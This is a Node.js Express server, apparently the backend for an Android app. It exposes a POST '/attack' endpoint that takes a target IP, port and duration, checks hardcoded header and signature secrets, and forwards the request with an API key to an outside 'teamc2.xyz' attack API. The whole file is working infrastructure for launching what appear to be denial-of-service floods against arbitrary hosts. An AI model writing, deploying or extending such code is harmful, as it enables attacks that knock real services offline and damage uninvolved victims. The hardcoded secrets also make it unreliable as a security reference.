require("dotenv").config();

const express = require("express");
const axios = require("axios");
const cors = require("cors");
const crypto = require("crypto");

const app = express();

app.use(cors());
app.use(express.json());

// ENV
const API_KEY = process.env.API_KEY;
const PORT = process.env.PORT || 3000;

console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");
console.log("Binding PORT:", PORT);

// ================= 🔐 SECURITY =================

// 🔐 SECRET (same as Android)
const SECRET = "SECRET123";

// 🔐 SHA256
function sha256(data) {
  return crypto.createHash("sha256").update(data).digest("hex");
}

// ================= ROUTES =================

app.get("/", (req, res) => res.send("OK"));
app.get("/health", (req, res) => res.send("OK"));

app.post("/attack", async (req, res) => {
  try {
    // 🔐 HEADER CHECK
    if (req.headers["x-sec"] !== "9xK3pL") {
      return res.status(403).json({ error: "Forbidden" });
    }

    let { ip, port, time } = req.body;

    // 🔒 Validation
    if (!ip || !port || !time) {
      return res.status(400).json({ error: "Missing params" });
    }

    port = Number(port);
    time = Number(time);

    if (isNaN(port) || isNaN(time)) {
      return res.status(400).json({ error: "Invalid port/time" });
    }

    // 🔐 SIGNATURE VERIFY
    const expected = sha256(ip + port + time + SECRET);

    if (req.headers["x-sign"] !== expected) {
      return res.status(403).json({ error: "Invalid sign" });
    }

    if (!API_KEY) {
      return res.status(500).json({ error: "API key missing" });
    }

    // 🔥 ORIGINAL LOGIC
    const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;

    const response = await axios.get(url, { timeout: 15000 });

    return res.json({
      success: true,
      data: response.data,
    });

  } catch (err) {
    console.error("ERROR:", err?.response?.data || err.message);

    return res.status(500).json({
      error: err?.response?.data || "Server error",
    });
  }
});

// ================= START =================

const server = app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});

// Graceful shutdown
process.on("SIGTERM", () => {
  console.log("SIGTERM received. Shutting down...");
  server.close(() => process.exit(0));
});